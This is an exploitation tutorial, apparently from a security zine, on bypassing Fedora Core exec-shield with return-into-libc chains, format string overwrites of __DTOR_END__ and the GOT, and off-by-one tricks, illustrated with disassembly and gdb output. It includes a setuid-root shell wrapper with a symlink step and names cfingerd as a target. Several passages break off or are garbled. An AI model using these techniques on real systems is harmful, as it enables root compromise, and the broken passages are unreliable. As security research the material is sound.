P.S: I am very worried about miss-translation may occur.
     So, I have tried to explain the ideas with picture and graph than words.
     Some of these contents were published on POC 2006 held in Korea.
     I have put the old concept and new one altogether for coherence.
     So, Please be generous about the overlap. All these codes and exploit
     are tested on Fedora Core system.

7 - Reference 


  I had the first contact with Fedora Core exe-shield system from a hacking
competition 2 years ago. Since then, I had studied the system for a month and
I published it on POC 2006(Power Of Community) conference held in Korea.
What I did and studied was application of existing return-into-libc technique
which had been studied by many excellent hackers to latest system.
This paper contains very simple things and you probably know many of them.

  This paper can be separated into 3 parts.
The first section is about trying stack overflow attack on exec-shield
environment. The second section is about trying format string attack on
exec-shield by using some features of some functions. And we will discuss
some attack technique for changed prolog and epilog and both remote and local 
attack skills since Fedora Core 5 system. Fedora Core system has exec-shield 
kernel by default, so I , mostly , will talk about Fedora Core system. As a 
matter of course, those technique can be applied to CentOS , White box linux 
and Redhat Enterprise with little change. I strongly recommend you to read
references before reading this paper.



--[ 2 - Brief features of Fedora Core system (gcc + glibc + exec-shield) 

  Fedora Core is a project run by Redhat and it provides technical
background. Fedora Core (F/C since now), unlike old RedHat OS, has stack and
heap hacking prevent system called exec-shield. Exec-shield makes its
specialty of blocking all the existing attacks concern stack, buffer,
function pointer overflow and overwriting data structure or injecting code
on that data structure. You can find more by looking ANNOUNCE-exec-shield
on Reference 7.16


----[ 2.1 - non-executable randomization stack, malloc heap, randomization library

  Stack and data area, heap area allocated by malloc() function are now
non-executable, and it makes classic shellcode useless. Area that library is
mapped ,merely, has execute privilege. But even this will be re-mapped on
every single execution. This randomizing algorithm ,unlike that of Redhat
Linux 9.0, is very unpredictable. It looks very similiar to Openwall Project
(7.12) of Solar Designer and PaX kernel system (7.13)


----[ 2.2 - Addressing system under 16mb (NULL pointer dereference protection)

  Kernel re-maps all PROT_EXEC mapping in ascii-armor area and make its
address system less than 16mb. This idea came from the fact that hackers use
4byte library address when they make overflow attempt on old 32bit system.
By doing this, memory address now has null in the address it means many
memory related hacking technique such as return-into-libc(7.2) are now hard
to be used. Sometimes, there is a chance to enter null into overflowed
buffer easily. But on this paper, I am not going to talk about this.
In addition, recent changes on glibc make some library function address end
with null or 0x20.


----[ 2.3 - PIE technology (changed gcc)

  PIE stands for Position Independent Executables is a similar concept with
old PIC. This is a way to protect application from being exploited by attacks
such as buffer overflow.

----[ 2.4 - Changed method of accessing function parameter (changed glibc)

  F/C 3 has glibc 2.3.3 on it. This glibc handles the commands that passed
into system() and exec family function with %ebp register. With the stack
overflow happening, hacker can manipulate %ebp register, so there is still
a good chance to indicate certain command to execute. 


fedora core 3 glibc 2.3.3 system():

	<system+17>: mov    0x8(%ebp),%esi		; refers %ebp + 8

fedora core 4 glibc 2.3.5 system():

	<system+14>: mov    0x10(%esp),%edi		; refers %esp + 16 

But since glibe 2.3.5 on F/C 4, it refers %esp register that a user can not
directly manipulate. glibc-2.x.x/posix/Makefile gives you a great
explanation about why did it happen.


-bash-3.00$ pwd
/tmp/glibc-2.3.5/posix
-bash-3.00$ cat Makefile |grep fomit
CFLAGS-wordexp.os = -fomit-frame-pointer
CFLAGS-spawn.os = -fomit-frame-pointer
CFLAGS-spawnp.os = -fomit-frame-pointer
CFLAGS-spawni.os = -fomit-frame-pointer
CFLAGS-execve.os = -fomit-frame-pointer
CFLAGS-fexecve.os = -fomit-frame-pointer
CFLAGS-execv.os = -fomit-frame-pointer
CFLAGS-execle.os = -fomit-frame-pointer
CFLAGS-execl.os = -fomit-frame-pointer
CFLAGS-execvp.os = -fomit-frame-pointer
CFLAGS-execlp.os = -fomit-frame-pointer
-bash-3.00$ 

you can see that library structure has been changed by -fomit-frame-pointer
option. The option is also applied to exec family functions as well.


fedora core 3 glibc 2.3.3 execve():

	<execve+9>:  mov    0xc(%ebp),%ecx		; second argument of execve() 
	<execve+27>: mov    0x10(%ebp),%edx		; third argumet of execve() 
	<execve+30>: mov    0x8(%ebp),%edi		; first argument of execve() 

fedora core 4 glibc 2.3.5 execve():

	<execve+13>: mov    0xc(%esp),%edi		; first argument of execve()
	<execve+17>: mov    0x10(%esp),%ecx		; second argument of execve() 
	<execve+21>: mov    0x14(%esp),%edx		; third argument of execve()

execve() function in old glibc (2.3.3) refers command argument from memory
of %ebp + 0x08, but in last version of glibe (2.3.5), it refers %esp + 0x0c.



--[ 3 - Stack based overflow exploitation on exec-shield environment

  Now, we confront with some obstacles. First, the library function has NULL
within its address. Second, we need to fight some glibc functions that are
compile with -fomit-frame-pointer option under exec-shield which is
non-executable on both stack and heap. Fortunately, it is not the worst
situation. As a matter of fact, we can tell whether the attack will be
a piece of cake or not, only after analyzing structure of target program.
Let me introduce some of the possible hacking technique.


----[ 3.1 - Exploit by moving %esp, %ebp register 

  Below is the easiest and the most common way to attack system with
-fomit-frame-pointer option compiled glibc. Before going into the attack
technique, I feel like to tell you "how to move %esp register by 4bytes".

	ret	; pop %eip

Generally, it is very common to pop %eip register from stack to return to
previous function. it is called epilog process and this process finally
moves %esp register by 4bytes.


<- stack grows this way                                     address grows this way ->
...                          10     14     18     22 (return address moves by 4bytes)
|...--------------------------|------|------|------|-----------------------------...|
                           [ret]   [ret]  [ret] [XXXX]
                              |    ^ |    ^ |     ^
                              |    | |    | |     |
                              +----+ +----+ +-----+ (%esp register moves by 4bytes)
                              %esp+4 %esp+4 %esp+4 (stack gets smaller by pop)

With this technique, we can use some of the contents in stack to attack the
system and indicate a certain location of stack to be a argument of function
that is called only for once. In addition, we can move the stack pointer by
greater than 4bytes.


fedora core 5 glibc 2.4, gcc 4.1.0-3:

	<__libc_csu_init>:
	...
	add    $0x1c,%esp
	pop    %ebx
	pop    %esi
	pop    %edi
	pop    %ebp
	ret

	<__do_global_ctors_aux>:
	...
	add    $0x4,%esp
	pop    %ebx
	pop    %ebp
	ret

glibc since F/C 5 skips the epilog process with some functions which exist
in binary by default. This helps us to move %esp register by as many bytes
as we want. Only with this condition, it is possible to demonstrate the
technique of Phrack 58-4 (by Nergal 7.7). Especially, by using "plt" string
copy function, it is also possible to call same function for many times and
by calling it appropriately we can finally execute shellcode (Phrack 58-4,
3.2 contains this vulnerability). We are going to talk about this at
chapter 5.3.


<- stack grows this way                                    address grows this way ->
+-----------+------+------------+------------+-----------+------+------------+-----+

               ^                                           ^
               |                                           |
               +-------------------------------------------+
                 (As many bytes as %esp is added or popped)

We also can manipulate %esp register in directly by doing leave as if we can
manipulate %esp register well.


----[ 3.2 - Remote exploit by moving %esp register

  I want to tell you about remote attack by moving %esp register on F/C 3 as
an example. It only happens on a special circumstance but it still tells us
that the attack by moving %esp register is possible. 

First, F/C 3 has glibc 2.3.3 and glibc 2.3.3 has __libc_start_main() function
that calls _setjmp() gives us a very nice attack example.


fedora core 3 glibc 2.3.3, gcc 3.4.2-6.fc3:

	<__libc_start_main+160>:     call   0xf6edf720 <_setjmp>
	<_setjmp+0>: xor    %eax,%eax
	<_setjmp+2>: mov    0x4(%esp),%edx
	<_setjmp+6>: mov    %ebx,0x0(%edx)
	<_setjmp+9>: mov    %esi,0x4(%edx)
	<_setjmp+12>:        mov    %edi,0x8(%edx)	; IMPORTANT!
	<_setjmp+15>:        lea    0x4(%esp),%ecx	; breakpoint
	<_setjmp+19>:        mov    %ecx,0x10(%edx)
	<_setjmp+22>:        mov    0x0(%esp),%ecx
	<_setjmp+26>:        mov    %ecx,0x14(%edx)
	<_setjmp+29>:        mov    %ebp,0xc(%edx)
	<_setjmp+32>:        mov    %eax,0x18(%edx)
	<_setjmp+35>:        ret
	<_setjmp+36>:        nop

...
Breakpoint 1, 0x00a2172c in _setjmp () from /lib/tls/libc.so.6
(gdb) x $edi
0xfefffb10:     0x00b1cff4
(gdb) x $edx
0xfefffb10:     0x00b1cff4
(gdb) x $edx+8
0xfefffb18:     0xfefffb10		; 8bytes lesser
(gdb)

Through the process ,%edx + 8 has memory address that smaller than itself by
8bytes. Now, what if we move the %esp register to old _setjmp() %edx register
and then call system() function?


<-- stack grows this way                                       address grows this way -->
+------------+----------+------------+------------+------------+------------+-----------+
|     buf    |   %ebp   |     ret    |   ret+4    |   ret+8    |   ret+12   |   ret+20  |
+------------+----------+------------+------------+------------+------------+-----------+
... xxxxx ... 0x70707070 main()'s ret main()'s ret main()'s ret main()'s ret  system();

Below is the process 

(1) After overwriting %ebp with 0x70707070 for test, 
    move %esp to old _setjmp() %edx by repeating ret (pop %eip)

(2) Calling system() function at the position of old _setjmp() %edx 
    register saves old %ebp register to stack by prolog process

(3) After prolog process, now %ebp of system() function points 0x70707070


* Stack status before attack:

fedora core 3 glibc 2.3.3, gcc 3.4.2-6.fc3:

	<_setjmp+12>:        mov    %edi,0x8(%edx)

0xfef16bf0:     0xf6fdaff4      0x00000000      0xfef16bf0
                ~~~~~~~~~~                      ~~~~~~~~~~
                     |                               |
                     +--> old _setjmp() %edx         +--> old _setjmp() %edx+8 

* Stack status after attack:

fedora core 3 glibc 2.3.3, gcc 3.4.2-6.fc3:

	<system+0>:  push   %ebp		; %ebp has 0x70707070.
	<system+1>:  mov    %esp,%ebp		; recent %ebp becomes pushed old %ebp

0xfef16bf0:     0x70707070      0x00000000      0xfef16bf0
                ~~~~~~~~~~                      ~~~~~~~~~~
                     |                               |
                     +--> system() %ebp              +--> system() function argument

system() function refers %ebp+8 as a argument ,so above will try to execute
0x70707070. Thus we can use strings like "sh" (0x6873) to execute a shell.
Like this case, you need to find out useful values on stack by repeating ret
command. This is a tiny example of exploit using structure of a program.
There may be a lot more possibilities to exploit when it comes to real
applications.


----[ 3.3 - Using exec family function and symlink

  By moving %esp, we can search stack for a right value for a function
argument. We should find three values from stack for execve(), because
execve() function refers arguments by %esp register address. You can,
of course, use execv() that uses only 2 arguments.


* Stack status after executing exploit:

fedora core 4 glibc 2.3.5, gcc 4.0.0-8:

	<execve+0>:  push   %edi		;  prolog
	<execve+1>:  push   %ebx

	<execve+13>: mov    0xc(%esp),%edi
	<execve+17>: mov    0x10(%esp),%ecx
	<execve+21>: mov    0x14(%esp),%edx

<- stack grows this way                                 address grows this way ->

              +---------------------------->
                          (flow)

We can see getting first argument from %esp+0x0c after prolog process of
execve() function. After 9 times of moving %esp register by ret, I could find
appropriate command for the first argument of execve() function when I tested
on F/C 4.


* Stack status after 9 times of repeating ret code and calling execve() function:

fedora core 4 glibc 2.3.5, gcc 4.0.0-8:

(gdb) br *execve+13

(gdb)
0xbf8b4298:     0x08048296
(gdb)

It shows that %esp has moved till the starting address of __libc_csu_init()
function. The address values stored in that point is stored in stack before
main(). Now that we got a address value to execute as a command, all we need
to do now is to link with a program that we want to execute for privilege
elevation through syslink. This syslink technique came from Lamagra (7.4)


[x82@localhost tmp]$ cat sh.c
int main()
{
	setuid(0);
	setgid(0);
	system("/bin/sh");
}
[x82@localhost tmp]$ gcc -o sh sh.c
[x82@localhost tmp]$ ln -s sh `printf "\x55\x89\xe5\x57\x56\x53\x83\xec\x0c\xe8"`

We can link __libc_csu_init() function code itself as a execution command.
This will be quite effective on real application exploit. You can find more
in exploit code example.


----[ 3.4 - Using exec family function and environment variables 

  I have thought about this technique when I tried local man exploit. This
seems quite effective under certain circumstance that a hacker can put
ret (pop %eip) command as many as he want. If there were a vulnerability on 
a local variable located in a stack frame near argument pointer,
environment variable pointer, that would be the best condition for this skill
to work.

argument pointer and environment variable pointer is made of array of
pointers that point each datum. There is, always, Null at the end of the
pointer and we can judge whether it is the end of pointer by NULL.

I want you to read FC_local_environ_bof.txt file on reference 7.18 for base
knowledge. First we need to call some functions whose arguments can be set
as environment variables like execve() and then assign each argument in
environment variables. Then, by repeating ret code, move %esp register
to the environment variable pointer ,and ,finally, call exec family function.

Attack flow will be like below whatever execv family function you choose.
for me, I chose execve() function.


fedora core 6 glibc 2.5, gcc 4.1.1-30:

Environment variable:

+------------------+
|     "./sh"       |: will be the first argument of execve()
+------------------+

Attack code:

All we need to do is set execve() function 8byte prior to environment
argument pointer. By doing so, the "./sh", first environment variable that
we entered, will be mistaken as the first argument of execve() when execve
is called . It happens because computer refers the address of %esp + 4byte
as argument.

It is very reasonable to put null code in environment variable for 5 times.
the second environment variable pointer after the first one "./sh" should
have 4bytes of null (0x00000000). That's why I entered 4bytes of null.
And the third environment variable pointer also should have 4bytes of null
code. So, I added 1 more byte of null to satisfy this condition. (You can
use not only the environment variable pointer but also argument pointer)

----[ 3.5 - Exploit on classic shellcode library area

  Ret code and environment variable pointers are also used for this technique.
There is nothing new about this technique, but it still means something for
it can execute a classic shellcode. First, we should remember that the
classic shellcode can be run in library.

Attack process: 

(1) Declare shellcode in environment variable through execve() function.

(2) Remember not to use copy function address under 16 mb, use plt copy
    function code. Thus, we can make the first argument of copy function.

(2) Repeat ret code to make the shellcode environment variable pointer
    declared at step 1 the second argument of copy function.

(4) Put ret code again right after calling copy function. By doing so,
    The first argument of copy function, shellcode, will be called.

(5) You should input executable library address into the first argument
    of copy function. We should be thankful that library address is located
    within 16mb (3byte)

Put shellcode into empty library space and do ret code. Then, library address
that contains shellcode will be popped into %eip and we can finally execute
a shell.

To call copy function many times, we can try %esp moving technique that
mentioned at chapter 3.1. Because this skill can move stack pointer more than
4bytes, we can try other attack technique. You should check chapter 5.3 and 5.4 
for more.

Appendix codes at chapter 6 will prove those 4 technique already been told.

we study at chapter 3.2. And 0x82-break_FC4.c code at 6.2 is about exec

--[ 4 - How to do format string exploit on exec-shield environment

  Unlike overflow technique, moving on stack is not easy on format string
attack. So, we will take advantage of some special functions to attack.


----[ 4.1 - Remote attack by using do_system() function

  I have found that system() function calls do_system() since F/C glibc
2.3.3. Old system() function called execve() internally, but changed system()
input command argument into %esi register and copy it to %eax register.
Finally, make it an argument of do_system() function.


fedora core 3 glibc 2.3.3, gcc 3.4.2-6.fc3:

	<system+17>: mov    0x8(%ebp),%esi		; insert the value at %ebp+8 into %esi register
	<system+46>: mov    %esi,%eax			; insert %esi regiseter into  %eax register
	<system+62>: jmp    0x77d320 <do_system>	; call do_system()

do_system() receives command argument through %eax register and makes
"sh -c command" then passes it to execve(). In short, do_system() doesn't use
frame pointer and stack pointer when it receives an argument. It only refers
%eax register. That's why we can take advantage of do_system(). What would
happen if we call do_system() inside of __do_global_dtors_aux() function?


fedora core 6 glibc 2.5, gcc 4.1.1-30:

	<__do_global_dtors_aux+0>:   push   %ebp
	<__do_global_dtors_aux+1>:   mov    %esp,%ebp
	<__do_global_dtors_aux+3>:   sub    $0x8,%esp

	<__do_global_dtors_aux+25>:  call   *%edx          (5) call __DTOR_END__
	<__do_global_dtors_aux+27>:  mov    0x80495b8,%eax (1) change %eax into __DTOR_END__
	<__do_global_dtors_aux+32>:  mov    (%eax),%edx    (2) %edx has the valeu of __DTOR_END__
	<__do_global_dtors_aux+34>:  test   %edx,%edx      (3) go back if %edx is not NULL
	<__do_global_dtors_aux+36>:  jne    0x8048371 <__do_global_dtors_aux+17>
	<__do_global_dtors_aux+38>:  movb   $0x1,0x80495bc
	<__do_global_dtors_aux+45>:  leave
	<__do_global_dtors_aux+46>:  ret
	<__do_global_dtors_aux+47>:  nop

You can find %eax register become __DTOR_END__ +4. After the %eax register
become __DTOR_END__, %edx has the value of __DTOR_END__. If %edx register is
not NULL, %eax register would move 4bytes (__DTOR_END__+4) and call *%edx.
It continues to add 4bytes and call each function saved in __DTOR_END__ section.

If __DTOR_END__ section is overwritten with do_system() address, %eax register
would be 4byte more than __DTOR_END__. Let's debug after overwriting
__DTOR_END__ section with do_system() to check.

We can see %eax is 4bytes over __DTOR_END__. This will open a new shell if
we write "sh" string on %eax register. There is a good chance to execute
shell without stack on remote. You can see more on exploit code example.


----[ 4.2 - Local exploit by moving %esp, %ebp register

  Although It is very restricted than former technique, we can still move
%esp and %ebp by format string technique by making frames many times on
stack. I thought I could move %esp, %ebp register by calling a function
continually. But general function that does prolog and epilog would not mean
anything. So, I decided to try __do_global_dtor_aux(). First of all, we need
to make a frame.


	<__do_global_dtors_aux+25>:  call   *%edx ; push %eip

	<__do_global_dtors_aux+0>:   push   %ebp

	<__do_global_dtors_aux+3>:   sub    $0x8,%esp

+---------- 16byte ---------++---------- 16byte ---------++---------- 16byte ---------+

There will be 16bytes of space when you repeat the process above. It is
possible to raise stack without removing frame because of the 25th line in
__do_global_dtors_aux() that calls desired function by call *%edx syntax.
We can move %esp and %ebp register indirectly by using
__do_global_dtors_aux(). In addition, _fini() function that calls
__do_global_dtors_aux() also can move stack pointer.


fedora core 6 glibc 2.5, gcc 4.1.1-30:

	<_fini+0>:   push   %ebp
	<_fini+1>:   mov    %esp,%ebp
	<_fini+3>:   push   %ebx
	<_fini+4>:   sub    $0x4,%esp
	<_fini+7>:   call   0x8048444 <_fini+12>
	<_fini+12>:  pop    %ebx
	<_fini+13>:  add    $0x1100,%ebx
	<_fini+19>:  call   0x8048300 <__do_global_dtors_aux>
	<_fini+24>:  pop    %ecx
	<_fini+25>:  pop    %ebx
	<_fini+26>:  leave
	<_fini+27>:  ret

It can adjusted depends on target program architecture.


----[ 4.3 - Using __do_global_dtors_aux() function, setuid() function and do_system() function

  We can indicate function argument based on chapter 4.2 even if it is
restricted. But the do_system() function technique is still not good enough
for a local exploit. That's why we should use setuid() function with it.
setuid() refers its argument from %ebp+8. All we need to do is find some
address that %ebp+8 is NULL and call the function.

In my case on F/C 6, I could make the argument of setuid() 0(null) when I
called __do_global_dtors_aux() function once again. Now, all we need to do is
calling do_system() function and set "sh" string properly. then, we will get
a root shell.

...

Stack based overflow that uses ret(pop %eip) code and execve() function will
move %esp register by 4bytes. (address increases and stack decreases.) But
the technique we are talking about is opposite to that. It moves %esp and
%ebp by 16bytes (address decreases and stack increase.) We can find right
value from stack by increasing or decreasing registers.


----[ 4.4 - Using __do_global_dtors_aux() function and exec family function

  Attack technique that I mentioned at chapter 4.3 has a problem that it is
useful only to get root uid. To solve this problem, most of local overflow
technique uses exec family function. On this chapter, I will show you local
format string technique that uses exec family function.

I will use little bit of __do_global_dtors_aux() function to launch an attack.

First, I made a frame on stack by calling __do_global_dtors_aux() function.
If you don't declare any local variable and only re-execute the call code in
__do_global_dtors_aux(), it would store the %eip of recent
__do_global_dtors_aux() in stack. Now, you can use stored %eip as the first
argument of execv() when you just call execv() function. (we use execv()
function because this function needs only 2 arguments) Rest of attack process
is same as exec family function + symlink attack.

Attack process:

(1) Overwrite __DTOR_END__+0 address with __do_global_dtors_aux() function
    address.

(2) Overwrite __DTOR_END__+4 address with __do_global_dtors_aux()+27
    address.

(3) Overwrite __DTOR_END__+8 address with execv() function address.

(4) symlink with the program that executes %eip of __do_global_dtors_aux()
    points.

Stack will be like this, if you allocate local variables and execute
call *%edx syntax properly.

To make stack structure like that, the call command in
__do_global_dtors_aux+25 has to be executed correctly. To execute
call command correctly, we need to start from __do_global_dtors_aux+27 where
right after call *%edx command is done. You should look at 27th code in
__do_global_dtors_aux in chapter 4.1.


	<__do_global_dtors_aux+27>:  mov    0x80495b4,%eax
	                                    (Starting procedure to call *%edx register)

Those are the value of each argument after calling execve() fucntion inside
of execv() function.

We can symlink _do_system_dtors_aux() + frame_dummy() function code that we
looked through gdb as a command. This technique is also highly useful when
you try to exploit real application. More details are in the example code.


----[ 4.5 - Changing __DTOR_END__ location (overwriting p section)

  There is a problem when you call __do_global_dtors_aux() function mentioned
at 4.2. It can overwrite some memory areas that hold critical information
when you call the function many times. It is true that these overwritten
heap area always can have data entry structure and some critical information.
Thus, it is difficult to call functions many times freely. Actually, there is
some section tables after __DTORS_END__ section as you see below. 


...
+-------------------------+
|      __DTOR_END__       |
+-------------------------+
|      __JCR_LIST__       |
+-------------------------+
|        _DYNAMIC         |
+-------------------------+
|  _GLOBAL_OFFSET_TABLE_  |
+-------------------------+
|       data_start        |
+-------------------------+
...

If you repeat more __do_global_dtors_aux() function to search information in
stack, the chance of overwriting important entry such as
_GLOBAL_OFFSET_TABLE_ will be greater. This eventually causes some bad effect
to program flow
		
The technique we are going to talk about is to use empty space on heap by
changing the position of section arbitrarily not by using particular
__DTOR_END__ section that declared while compile. Let's look at
__do_global_dtors_aux() again.


Fedora core 6 glibc 2.5, gcc 4.1.1-30:

	<__do_global_dtors_aux+6>:   cmpb   $0x0,0x8049574 (1) check whether 0x8049574 is 0
	<__do_global_dtors_aux+13>:  je     0x804831b <__do_global_dtors_aux+27>
	<__do_global_dtors_aux+15>:  jmp    0x804832d <__do_global_dtors_aux+45>
	<__do_global_dtors_aux+17>:  add    $0x4,%eax
	<__do_global_dtors_aux+20>:  mov    %eax,0x8049570 (3) save 4bytes added %eax into 0x8049570
	<__do_global_dtors_aux+25>:  call   *%edx
	<__do_global_dtors_aux+27>:  mov    0x8049570,%eax (2) copy the value in 0x8049570 to %eax
	<__do_global_dtors_aux+32>:  mov    (%eax),%edx
	<__do_global_dtors_aux+34>:  test   %edx,%edx
	<__do_global_dtors_aux+36>:  jne    0x8048311 <__do_global_dtors_aux+17>

The first procedure is comparing 0x08049574 with 0. This section is completed
section and has NULL value naturally. Then save the value inside 0x8049570 to
%eax register. This is p section which has the address of __DTOR_END__
section. In short, %eax register now has __DTOR_END__ section address.
Finally, copy %eax register + 4 addresses to p section.

Now, we can change the position of __DTOR_END__ section anywhere we want. 
Attack process will be like this:

(1) Copy the content of p section into empty space in heap.

(2) Overwrite p section+4 (completed section) with null to evade comparison.

(3) Allocate a function that you want to call to empty space in heap

Continuing.

It is not a hard job to insert desired value into some place when you do
format string attack.

Unfortunately, do_system() function format string attack mentioned at
chapter 4.1 must use __DTOR_END__ section to exploit. So, it was impossible
to attack till the program is re-compiled if __DTOR_END__ section had
terminator character, null character and special character.

But, the p section changing skill that we just talked about doesn't need
__DTOR_END__ changed. It makes __DTOR_END__ section where you want. Thus, you
can exploit the system without any trouble. Look example code to find more.


----[ 4.6 - Format string in classic shellcode library area

  This is not an efficient attack technique but I want to talk about this
because I want to prove that shellcode is still executable through library
area. The core of this technique is overwriting shellcode on library area by
using format string technique.

To make this work, you should enter library address with null into
environment variable or argument and brute-force the changing memory address
by $-flag.

These are the attack procedure: 

(1) Find useable library address. 
(2) Input the library address which is for under 16mb as a program argument
    and find stack by using $-flag
(3) Enter little shellcode into library by format string technique
(4) Overwrite the library address that holds shellcode with __DTOR_END__
    address of the target program.

These are the exploit procedure: 

(1) Find $-flag value to overwrite __DTOR_END__ section with certain value.
(2) Find $-flag value to overwrite Shellcode into library address.
(3) Get library address and __DTOR_END__ address needed for attack.
(4) The address of __DTOR_END__ and format string code that overwrites
    shellcode on somewhere in library, and format string code that overwrites
    shellcode's address on __DTOR_END__'s address are going into the first
    argument. And since second argument, library addresses are saved.
(5) Try to attack with increasing PAD value to correct the align with library
    address we input continually.

Find more in example code.


----[ 4.7 - Example code

  We have seen a few possible technique of format string under exec-shield
environment. Some of appendix code at chapter 6 is to prove those 4 attack
skills I have mentioned.

First, 0x82-remote_do_system.sh script provided at chapter 6.5 is about the
remote attack technique mentioned at chapter 4.1. Second,
0x82-p_section_overwrite.c code at 6.6 is for __do_global_dtors_aux() +
setuid() + do_system() attack at 4.3 and p section overwrite at 4.5. Third,
0x82-dtors_execv_ex.c at 6.7 is about the __do_global_dtors_aux() +
exec family attack technique mentioned at 4.4. Finally, Shellcode attack code
at 4.6 is shown at 6.8 0x82-library_terror/part_one.c,
0x82-library_terror/part_two.c



--[ 5 - How to exploit since Fedora Core 5 system 

  Those vulnerabilities that I am going to tell you through chapter 5.1 and
5.2 do not seem realistic. I mean , there is almost no chance to occur these
vulnerabilities. Because only the prolog and epilog of the main() have been
changed. It seems like rough mixture of StackGuard and Stackshield(7.6).
On the other hands, at chapter 5.3 we are going to see moving stack pointer
over 4bytes which is mentioned at chapter 3.1 and also can be efficient when
you do overflow attack on real application at remote.


----[ 5.1 - Changes on main() function prolog and epilog

  Basic algorithm is pretty similar to StackShield. But it keeps return
address in stack not in heap, and puts %ecx register which does similar job
with canary of StackGuard near frame pointer to prevent the return address
from alteration.


* Changed main() prolog since Fedora core 5:

(1)	lea    0x4(%esp),%ecx
(2)	and    $0xfffffff0,%esp
(3)	pushl  0xfffffffc(%ecx)
(4)	push   %ebp		; prolog of normal main()
(5)	mov    %esp,%ebp
(6)	push   %ecx

(1) Insert address of %esp+4 into %ecx register.
(2) Change %esp register address by doing "and" calculation. (%esp & -16)
(3) Save return address at %ecx - 4 in recent stack.
(4) Save %esp register of previous function in recent stack.
(5) Set frame pointer for main() by duplicating %esp into %ebp.
(6) Save %ecx register in recent stack and make it does same role with canary.

After all these process stack will be:

| Stack grows this way
V

These are the eplilog procedures.


Epilog of main() since F/C 5:

(1)	pop    %ecx
(2)	pop    %ebp
(3)	lea    0xfffffffc(%ecx),%esp
(4)	ret

(1) Pop %ecx register from stack.
(2) Pop %ebp (previous base frame pointer) from stack.
(3) Move %esp register to original return address by putting %ecx - 4 address
    in %esp.
(4) Go back to __libc_start_main() function when %eip is popped by ret command.

In short, it is impossible to change return address with ordinary stack
overflow because of %ecx register which does the same role with canary.


----[ 5.2 - Exploit by using off-by-one exploit with %ecx register

  Because It is extremely difficult to guess %ecx register, we overwrite the
last 1byte with NULL. Now, we need to enter address which will be return
address into %ecx-4 whose 1byte has been changed into null. It is similar to
frame pointer that changes return address indirectly. (7.5)

Enter ret code from address will be return address to 4byte before the end
of usable space. And make the last 4byte to execute main() epilog twice.
We execute epilog one more time because it moves %esp register near argument
pointer and environment variable pointer. (Similar concept mentioned at
chapter 3.4)

By making %ecx register to have environment variable pointer when it is
restored on main() epilog, we can make %ecx-4 which is the position of %esp
register be declared environment variable code.

Brief of attack is below.


Making attack code:

Fill all local variable but last 4byte with ret code. By doing so, we can
make return address ret code address by %ecx register off-by-one technique.
If we make stack like the picture below, We can do main() epilog twice and
call execve() function refer to the environment variable below.

----[ 5.3 - Overflow exploit overwriting __DTOR_END__ section

  On this chapter, we are going to talk about getting shell by overflow 
since F/C 5. If you could not find a good condition to
attack with only ret code, then you should look this chapter.

We can move stack pointer by %esp register moving technique at chapter 3.1.

The main idea of this chapter is deeply related to multiple calling of copy
function from Nergal(7.7). It is a technique that puts address of function that
you desire to execute(such as system function, do_system function and exec family)
into __DTOR_END__ like format string attack. 

First, we will see attack through do_system function. This technique doesn't 
use stack at all. On the others hands, system function and exec family function
need to use stack to attack the system.  
 
Attack process of do_system() function: 

(1) Find 1byte of address of do_system() function and sh string from program.
    And enter them in __DTOR_END__ section.

(2) Develop the way to move %esp by 12bytes by using plt copy function,
    __do_global_ctors_aux() function epilog, and the address we found
    previously. Eventually, these codes are used for copying do_system()
    address and  "sh" string to __DTOR_END__ section.

                   __do_global_ctors_aux()'s epilog (12byte)

(3) After making copy function, make %eip register that popped last have the
    address of __do_global_dtors_aux() function address. if you execute
    __do_global_dtors_aux() like this, do_system() copied to __DTOR_END__
    section would be called by command "call *%edx" and, finally,  will spawn
    a shell.

More details are below: 


fedora core 6 glibc 2.5, gcc 4.1.1-30:

Making attack code:

We will call strcpy() (copy function) several times by using 12byte %esp
move technique. Finding 1byte for each do_system() function address and
"sh" string in heap is still bugging but not a big deal.

This time, we will talk about attack technique which uses system function 
and exec family function. These functions need stack to do their job.

Attack Process:

(1) Find 1byte of address of function that you wish to run. This 1byte
    will be entered into __DTOR_END__ section.

(2) As I mentioned before, copy the function address to __DTOR_END__ section
    by using plt function and moving %esp by 12bytes. At this moment, you 
    can create desired command on heap ,just like do_system() attack, or
    you also can attack only using symlink.

(3) Let the %eip register popped last have address right after 
    __do_global_dtor_aux() function prolog. This will help stack pointer to
    be the same and we can make function argument easily because of this.



fedora core 6 glibc 2.5, gcc 4.1.1-30:

Making attack code:

It uses same technique with moving %esp by 12bytes previously introduced. 
It calls strcpy() function several times. This function will find 1byte of 
'sh' string and 1byte of address of execve() function from heap and copy this.

As we can control the stack pointer and the value, we can make arguments 
of execve() as we want. In addition, "/bin/sh" code in library is located 
at address under 16 mb ,so with some function that uses a few argument 
such as system() it can be used for remote attack. exec family function can 
copy 'sh' string on heap and symlink with a program to execute a shell 
just like do_system() attack. 

To make the exploit more adaptable to other systems, we may need to find
address of do_system() and "sh" string from ELF header or the starting of the
program's text area. Surely, the binaries compiled at similar environment
would have same static and same address. 

Here is a little tip. If you want to attack a real application, then you
should look for these functions below. Names of these functions are listed
on heap, so you can get 'sh' string from that.


bdflush()
tcflush()
fflush()

[root@localhost src]# objdump -d cfingerd | grep '<fflush@plt>:'
08048ff0 <fflush@plt>:
[root@localhost src]# gdb in.cfingerd -q

(gdb) x/s 0x8048738

Thus, we, now, can make highly adaptable exploit code for a specific
application. Refer example code for more details.


----[ 5.4 - Overflow exploit overwriting GLOBAL OFFESET TABLE

Technique on this chapter is similar to function execute skill at chapter 5.3. 
When you cannot use _do_global_dtor_aux() function or you don't know 
the address of both p section and __DTOR_END__, you can try this technique.

I will not talk details about plt and got. Our job is to find useful
stuff from inside of program and analyze that. 
Generally, plt is made like this


fedora core 6 glibc 2.5, gcc 4.1.1-30:

	<func@plt>:
	jmp *_GLOBAL_OFFSET_TABLE_
	push $n
	jmp _dl_runtime_resolve

If we call func's plt after changing its _GLOBAL_OFFSET_TABLE_ section to 
execve(), it would be:


	jmp execve();

__do_global_dtors_aux() function stores its %eip register as a return address, 
because the function uses "call execve()" command. But, on the contrary, 
when you attack through GOT section, unlike call function, it doesn't store
return address as a stack pointer. So we need to insert 4bytes of dummy 
on behalf of %eip register. It is a very small difference but also very 
critical thing for a attacker to make arguments for related function.


fedora core 6 glibc 2.5, gcc 4.1.1-30:

Making attack code:

Change GOT section for __libc_start_main() with address of execve() function
by multiple plt calling. It is same as moving %esp by 12byte technique at
chapter 5.3. Anyway, It will execute desired function by referring
it's stack pointer when you call the functionÂ¡Â¯s plt.

plt to jump to that function. third, it must have 4bytes of dummy value. 
You can find more in example code.

